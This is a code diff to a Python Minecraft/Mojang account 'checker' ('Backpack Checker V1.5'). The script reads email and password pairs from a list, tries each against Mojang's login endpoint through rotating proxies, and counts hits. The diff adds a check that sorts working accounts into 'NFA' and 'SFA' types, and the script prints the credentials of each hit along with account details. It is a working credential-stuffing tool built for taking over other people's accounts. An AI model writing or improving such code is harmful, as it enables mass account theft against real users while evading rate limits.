@@ -4,6 +4,8 @@ import os
 from colorama import init, Style, Fore
 from datetime import datetime
 init()
+AccountsChecked = 0
+Hits = 0
 failedToLogin = True
 debugmode = False # Warning! Enabling This Will Expose Your Auth Keys, Tokens are Other Sensitive Info in the Console. Because of this, it is recommended you leave this off for normal usage.
 token = ''
@@ -21,6 +23,8 @@ else:
 def accessToken(proxy):
     global token
     global failedToLogin
+    global AccountsChecked
+    global Hits
     payloads = {
     "agent" : "minecraft",
     "username" : email,
@@ -40,8 +44,12 @@ def accessToken(proxy):
             print(response_json)
         failedToLogin = False
         canlogin.append(email)
+        AccountsChecked = AccountsChecked+1
+        Hits = Hits+1
+        os.system(f"title "+f"Backpack Checker V1.5 l Hits: {Hits}")
         pass
     except:
+        AccountsChecked = AccountsChecked+1
         failedToLogin = True
         print(f"{Fore.RED}[FAIL]{Style.RESET_ALL} | Failed to login to {email}")
         if debugmode == True:
@@ -97,6 +105,21 @@ def checkMigration(proxy):
         else:
             canMigrate = False
 
+def checkAccountType(proxy):
+    global accountType
+    headers = {
+        "Authorization" : f"Bearer {token}"
+    }
+    r = requests.get("https://api.mojang.com/user/security/location", headers=headers, proxies={'http' : f'{proxy}'})
+    if r.status_code == 403:
+        accountType = "NFA"
+    elif r.status_code == 204:
+        accountType = "SFA"
+    else:
+        pass
+
+
+# Main bit lol
 with open('.\\accounts.txt', 'r') as f:
     proxynum = 0
     for line in f:
@@ -106,46 +129,56 @@ with open('.\\accounts.txt', 'r') as f:
         with open('.\\proxies.txt', 'r') as proxyfile:
             lineproxy = proxyfile.readlines()[proxynum]
             accessToken('http://' + lineproxy + '/')
-            if debugmode == True:
-                    print(f'Proxy Used: {lineproxy}')
-            proxynum = proxynum+1
-            try:
-                if failedToLogin == False:
-                    getUsername('http://' + lineproxy + '/')
-                    if debugmode == True:
-                        print(f'Proxy Used: {lineproxy}')
-                    proxynum = proxynum+1
-            except:
-                pass
-            try:
-                checkNameChange('http://' + lineproxy + '/')
-            except:
-                pass
-            try:
+            if failedToLogin != True:
                 if debugmode == True:
                         print(f'Proxy Used: {lineproxy}')
+                proxynum = proxynum+1
+                try:
+                    if failedToLogin == False:
+                        getUsername('http://' + lineproxy + '/')
+                        if debugmode == True:
+                            print(f'Proxy Used: {lineproxy}')
                         proxynum = proxynum+1
-            except:
-                pass
-            try:
+                except:
+                    pass
+                try:
+                    checkNameChange('http://' + lineproxy + '/')
+                except:
+                    pass
+                try:
+                    if debugmode == True:
+                            print(f'Proxy Used: {lineproxy}')
+                            proxynum = proxynum+1
+                except:
+                    pass
+                try:
+                    if failedToLogin == False:
+                        if namechange == True:
+                            namechange = 'True'
+                        else:
+                            namechange = 'False'
+                except:
+                    pass
+                try:
+                    checkMigration('http://' + lineproxy + '/')
+                    proxynum = proxynum+1
+                except:
+                    pass
+                try:
+                    checkAccountType('http://' + lineproxy + '/')
+                except:
+                    pass
                 if failedToLogin == False:
-                    if namechange == True:
-                        namechange = 'True'
-                    else:
-                        namechange = 'False'
-            except:
+                    print(f"""
+    Account Type: {accountType}
+    Email: {email}
+    Password: {password}
+    Username: {username}
+    Namechange: {namechange}
+    Can Migrate: {str(canMigrate)}
+                    """)
+                proxynum = proxynum+1
+                
+            else:
                 pass
-            try:
-                checkMigration('http://' + lineproxy + '/')
-            except:
-                pass
-            if failedToLogin == False:
-                print(f"""
-Email: {email}
-Password: {password}
-Username: {username}
-Namechange: {namechange}
-Can Migrate: {str(canMigrate)}
-                """)
-            proxynum = proxynum+1
-print(str(canlogin))
+print(f'Finished!')
